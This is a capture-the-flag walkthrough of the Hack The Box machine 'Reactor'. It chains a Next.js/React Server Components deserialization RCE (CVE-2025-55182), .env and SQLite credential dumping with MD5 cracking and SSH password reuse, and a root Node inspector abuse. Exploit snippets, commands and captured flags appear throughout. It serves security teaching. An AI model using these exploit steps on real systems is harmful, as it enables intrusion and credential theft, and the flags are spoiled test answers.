# Walkthrough: Reactor (HTB #900, Easy, 20 pts)

**Status: PWNED — user + root, 2026-08-29** ✅

This is the full story of our first box, told end to end. If you're new, read it
top to bottom — every step explains not just *what* we did but *why it worked*.

- **Target:** `10.129.106.68` (our own spawned lab instance)
- **Flags:** user `02215790ba967ed71c705bf911627373` · root `48de3837d84fe54c7cca4bfaf385912f`
- **Attack chain in one sentence:** a critical bug in the web framework gave us
  code execution → a password hash in the app's database became an SSH login → a
  forgotten debugger port on a root process became full root.

---

## Setting the scene

The box presents itself as **"ReactorWatch Core Monitoring System v3.2.1"** — a
fake nuclear-reactor monitoring dashboard for "Nuclear Dynamics Corp., Facility
SITE-7". The dashboard even lists personnel (Dr. Elena Rodriguez, Marcus Kim,
James Thompson), which we noted as potential SSH usernames for later.

Two services faced us: a website on port 3000, and SSH on port 22. That's the
whole outside of the building. Everything below is how we got from the sidewalk
to the server room.

---

## Stage 1 — Recon: two open doors

Our standard recon script runs nmap in two passes — first a fast sweep of *all*
ports so nothing hides, then a deep look at just the open ones:

```bash
# Pass 1: knock on ALL 65,535 TCP ports, fast
nmap -p- --min-rate 2000 -T4 -oN nmap/allports.txt 10.129.106.68

# Pass 2: interrogate only the open ones (-sC = default scripts, -sV = versions)
nmap -sC -sV -p 22,3000 -oN nmap/services.txt 10.129.106.68
```

The result was admirably small:

| Port | Service | What it told us |
|---|---|---|
| **22/tcp** | OpenSSH 9.6p1 (Ubuntu 24.04) | A remote-login door — useless without credentials, but a promise: *if we find a password anywhere, this is where it cashes in.* |
| **3000/tcp** | HTTP, `X-Powered-By: Next.js` | A web app — and it *introduces itself by name*. |

**Why port 3000 + `X-Powered-By: Next.js` was the clue.** Port 3000 is the
classic home of Node.js development servers, and `X-Powered-By` is a header where
the framework proudly announces itself. Even better, the response headers included
`Vary: RSC` and `x-nextjs-prerender: 1` — telling us the app uses **React Server
Components (RSC)** and is prerendered. Before we'd clicked a single link, the
server had told us its framework, its rendering mode, and its caching behavior.
Servers gossip; our job is to listen.

---

## Stage 2 — Enumeration: the sound of nothing

Next we threw **ffuf** at the site — thousands of guesses for hidden pages and
files (`/admin`, `/backup`, `.env`, …):

```bash
ffuf -u "http://10.129.106.68:3000/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -mc 200,204,301,302,307,401,403   # only show these "interesting" status codes
```

**Result: zero hits.** We then probed 30+ common, themed, and API paths by hand —
every one returned the same stock 404. No `/api/*`, no exposed `.env`, no source
maps. We also tested **CVE-2025-29927** (a Next.js middleware-auth bypass) with
all four known header variants — byte-identical responses, meaning the app has no
middleware-protected routes at all.

### Why "nothing found" was itself useful

A negative result prunes the map. The app's own router manifest said it has
exactly **two routes** (`/` and a not-found page), and the client-side JavaScript
contained *no application code* — everything is rendered server-side via RSC.
Conclusion: **there are no hidden doors; the attack surface is the framework's
own code.** So we stopped looking for unlocked windows and went to read the
framework's recall notices instead.

### The version fingerprint that decided the box

Buried in the downloaded JS chunks we found the exact stack:

- **Next.js 15.0.3**
- **React 19.0.0-rc-66855b96-20241106** (`react-server-dom-webpack`)

Now the CVE database does the heavy lifting. **CVE-2025-55182 "React2Shell"** —
an unauthenticated remote code execution bug, maximum severity (CVSS 10) — affects
exactly this pairing and was only fixed in **React 19.0.1+ / Next.js 15.0.5+**.
Our target was squarely inside the vulnerable range. The box being named
*"Reactor"* with RSC enabled felt like a wink from the box author.

---

## Stage 3 — Foothold: React2Shell (CVE-2025-55182)

### What the bug is, in plain English

With React Server Components, the browser can ask the server to run functions
("server actions"), and the request body travels in React's **Flight** format —
think of it as the order-ticket system between the dining room (browser) and the
kitchen (server).

The bug: **the kitchen doesn't check who wrote the ticket.** The server's Flight
deserializer happily processes attacker-crafted data *before* checking whether
the requested action even exists. So a stranger can hand the kitchen a recipe
that says *"step one: also give me your keys"* — and the kitchen obliges.

Technically: we send a `multipart/form-data` POST with a fake Flight "chunk"
whose properties we control. Through a short chain of property lookups
(`__proto__` → `constructor` → `constructor`), we steer the deserializer into
JavaScript's **`Function` constructor** — which builds a function from any string
— and the server then *calls* it. `Function("...our code...")()` means:
**run any JavaScript we want, inside the server's own Node process.**

### The exploit

Full source: [../boxes/reactor/loot/exploit.py](../boxes/reactor/loot/exploit.py).
The heart of it, line by line:

```python
headers = {
    "Next-Action": "x",   # any value works — the vulnerable decoder runs
                          # BEFORE the server checks the action ID
    "Content-Type": "multipart/form-data; boundary=%s" % BOUNDARY,
}
resp = requests.post(TARGET, data=body, headers=headers, timeout=30)
```

The `body` contains our fake chunk. Two details make it work:

1. **Hijacking the Function constructor** — the chunk's `_formData.get` field is
   set to `"$1:constructor:constructor"`. In JavaScript, almost everything's
   `constructor.constructor` *is* the `Function` constructor. When React's `$B`
   blob handler calls `_formData.get(...)`, it's actually calling
   `Function(our_code)` — and our code executes on the server.
2. **Smuggling the output home** — our injected JS runs the shell command, then
   *throws a fake `NEXT_REDIRECT` error* with the command output URL-encoded in
   its "digest". Next.js helpfully reflects that digest back to us in the
   `x-action-redirect` response header. It's like the waiter returning our fake
   "redirect slip" with the stolen goods written on the back.

Running it:

```bash
python3 exploit.py "id"
# [+] OUTPUT:
# uid=999(node) gid=999(node) groups=999(node)
```

**We could now run any command on the server** as the `node` user, with the app's
working directory `/opt/reactor-app`. Foothold achieved.

---

## Stage 4 — User flag: from database hash to SSH

### The .env and the database

Applications keep their secrets in environment files, so that's the first thing
we read:

```bash
python3 exploit.py "cat /opt/reactor-app/.env"
# DB_PATH=/opt/reactor-app/reactor.db
```

One pointer later we're reading the app's SQLite database:

```bash
python3 exploit.py "sqlite3 /opt/reactor-app/reactor.db 'SELECT * FROM users;'"
# engineer:39d97110eafe2a9a68639812cd271e8e
# admin:a203b22191d744a4e70ada5c101b17b8
```

Those 32-character hex strings are **MD5 password hashes** — the passwords after
being run through a one-way scrambling function.

### Why MD5 is broken (and fell in seconds)

MD5 was designed for *speed*, which is exactly what you **don't** want in a
password hash: a fast hash means an attacker can guess *billions of passwords per
second*. Worse, these hashes are **unsalted** (no per-user randomness mixed in),
so a given password always produces the same hash — precomputed lookup tables and
wordlists work perfectly.

We fed the hash to **hashcat** (`-m 0` = MD5 mode) with the **rockyou** wordlist
(~14 million real leaked passwords):

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# 39d97110eafe2a9a68639812cd271e8e:reactor1
```

`engineer:reactor1`. (The `admin` hash wasn't in rockyou — didn't matter, we only
needed one.) A weak, human-chosen password plus a fast unsalted hash = cracked
before your coffee cools.

### The pivot: database password → SSH

Remember port 22 from recon? People reuse passwords, and app databases often hold
the same credentials as system accounts. This is one of the most classic pivots
in all of pentesting: **loot a credential from one service, try it on every other
door.**

```bash
ssh engineer@10.129.106.68     # password: reactor1
cat /home/engineer/user.txt
# 02215790ba967ed71c705bf911627373   → submitted, accepted ✅
```

---

## Stage 5 — Root flag: the debugger left running

### Enumeration first (always)

Privesc starts with looking around: `sudo -l` (nothing — engineer may not run
sudo), SUID binaries (all stock), cron jobs (none), group memberships. One trap:
engineer is in the **lxd** group, which is normally instant root — but here
`/usr/sbin/lxc` was a **broken snap shim with no daemon behind it**. A decoy.
Lesson: verify before you chase; box authors plant shiny dead ends.

Then the process list gave up the real prize:

```bash
ps aux
# root  1385  ...  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

### Why this line is game over

`node --inspect=127.0.0.1:9229` starts Node's **V8 inspector** — the same
debugger Chrome DevTools uses — listening on port 9229. A debugger is not a
toy feature; it is a **remote control panel for the entire process**: anyone who
can talk to it can evaluate arbitrary JavaScript *inside* that process.

And this process runs as **root**.

The inspector binds to `127.0.0.1` (localhost only), which feels safe — the
design assumes "anyone local is trusted." But we *are* local now, via our SSH
session. So: a root process, with an open debugger port, reachable by any local
user = **a root shell waiting to be asked for.**

### The exploit

Full source: [../boxes/reactor/loot/inspector-root-rce.js](../boxes/reactor/loot/inspector-root-rce.js).
The two key moves:

```js
// 1. Ask the inspector's HTTP endpoint for its WebSocket address
http.get('http://127.0.0.1:9229/json/list', ...)

// 2. Speak CDP (Chrome DevTools Protocol): "evaluate this JS inside the process"
ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',          // the debugger's "run this code" command
    params: { expression: expr, returnByValue: true },
}));
```

The `expression` we send uses `child_process.execSync()` to run any shell command.
Since the *process* is root, our command runs as root:

```bash
node --experimental-websocket inspector-root-rce.js "id"
# uid=0(root) gid=0(root) groups=0(root)

node --experimental-websocket inspector-root-rce.js "cat /root/root.txt"
# 48de3837d84fe54c7cca4bfaf385912f   → submitted, accepted ✅  machine_pwned: true
```

(The `--experimental-websocket` flag just enables Node's built-in WebSocket
client — the box runs Node v20.20.2, so no tools needed installing; we used the
target's own runtime against itself.)

---

## Lessons to remember

> 1. **Version fingerprinting decides everything.** "A Next.js app" is trivia;
>    "Next.js 15.0.3 + React 19.0.0-rc" is a known CVSS-10 bug with a public
>    exploit. Always dig versions out of headers, JS bundles, footers, and
>    error pages.
> 2. **"Nothing found" is information.** Zero ffuf hits + a two-route manifest
>    told us the surface was the framework itself — and pointed us straight at
>    the CVE. Negative results prune the search tree; write them down and move on.
> 3. **Debug interfaces are keys to the kingdom.** A debugger port, an admin
>    panel, a metrics endpoint — anything built for developers is a full-power
>    backdoor if it reaches production. `node --inspect` on a root process *was*
>    the root shell.
> 4. **Password reuse bridges services.** One cracked MD5 from a SQLite file
>    became SSH access. Looted credentials get tried on *every* open door.
> 5. **MD5 is not a password lock.** Fast + unsalted = rockyou eats it in
>    seconds. When you see 32 hex chars in a `users` table, smile.
> 6. **Read `ps aux` before chasing shiny things.** The lxd group looked like
>    instant root and was a decoy; the boring process list held the real path.
>    Verify, then commit.

---

## Appendix: submitting flags via the HTB API

HTB's v4 ownership endpoint is gone; v5 works:

```bash
curl -X POST https://labs.hackthebox.com/api/v5/machine/own \
     -H "Authorization: Bearer $HTB_TOKEN" -H "Content-Type: application/json" \
     -d '{"id":900,"flag":"<flag>","difficulty":10}'   # difficulty = multiple of 10
# → "Reactor user/root is now owned."
```
